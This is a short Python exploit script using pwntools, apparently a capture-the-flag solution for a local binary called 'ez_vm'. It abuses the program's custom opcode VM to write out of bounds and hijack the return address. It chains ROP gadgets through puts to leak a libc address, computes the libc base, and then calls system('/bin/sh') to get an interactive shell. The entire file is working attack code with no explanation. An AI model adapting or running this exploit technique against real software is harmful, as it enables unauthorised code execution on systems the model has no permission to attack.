from pwn import *
#context.log_level="debug"
puts_plt = 0x401070
puts_got = 0x404018
pop_rdi = 0x00000000004011a3
m= 0x00000000004013b4
bss= 0x0000000000404000
ret=0x000000000040101a
p=process("./ez_vm")
e=ELF("./ez_vm")
libc=ELF("libc.so.6")
pause()
p.recvuntil("opcode: ")

def mov(a,b): # reg[a]=b
    s=b"\x01"
    s+= a.to_bytes(1, byteorder='little')
    s+=b"\x00\x00"
    s+= b.to_bytes(4, byteorder='little')
    
    return s
def store(a,b): # memory[a]=reg[b]
    s=b"\x03"
    s+= a.to_bytes(1, byteorder='little')
    s+=b"\x00\x00"
    s+= b.to_bytes(4, byteorder='little')
    return s
def bug(off1,ret_addr):
    
    c=mov(0,bss+off1)
    c+=store(2,0)
    c+=mov(1,ret_addr)
    c+=store(4,1)
    c=c.ljust(0x70,b"\x00")
    return c
payload=mov(1,0)
payload+=store(5,1)
payload+=bug(0x700,m)
payload+=p64(puts_got)
payload+=p64(puts_plt)
payload+=p64(m)
p.send(payload)
sleep(1)


payload=bug(0x650,m)
payload+=p64(puts_got)
payload+=p64(puts_plt)
payload+=p64(m)
p.send(payload)
sleep(1)

payload=bug(0x900,pop_rdi)
p.send(payload)
p.recvline()
leak=p.recvline().rstrip()
libc.address=u64(leak.ljust(8,b"\x00"))-libc.symbols["puts"]
print("libc_base: ",hex(libc.address))
payload=bug(0x850,m)
payload+=p64(next(libc.search(b'/bin/sh')))
payload+=p64(ret)
payload+=p64(libc.symbols["system"])
sleep(1)
p.send(payload)
sleep(1)
payload=bug(0x700,pop_rdi)
p.send(payload)

p.interactive()
